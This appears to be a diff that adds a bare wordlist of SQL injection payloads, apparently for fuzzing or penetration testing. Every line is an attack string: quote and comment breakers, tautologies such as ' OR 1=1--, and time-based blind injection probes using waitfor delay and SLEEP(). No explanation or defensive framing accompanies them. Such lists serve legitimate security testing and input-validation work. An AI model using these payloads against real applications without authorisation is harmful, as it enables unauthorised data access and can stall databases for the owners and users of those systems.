@@ -1,0 +1,19 @@
+'
+''
+""
+\u0022
+\u{22}
+;
+;%00
+--
+-- -
+'--
+' OR 1=1--
+0x4f52+1=1
+' OR '1
+" OR "" = "
+' OR '' = '
+' OR 1 = 1 -- -
+'; waitfor delay '0:30:0'--
+1; waitfor delay '0:30:0'--
+SLEEP(1) /*’ or SLEEP(1) or’” or SLEEP(1) or “*/
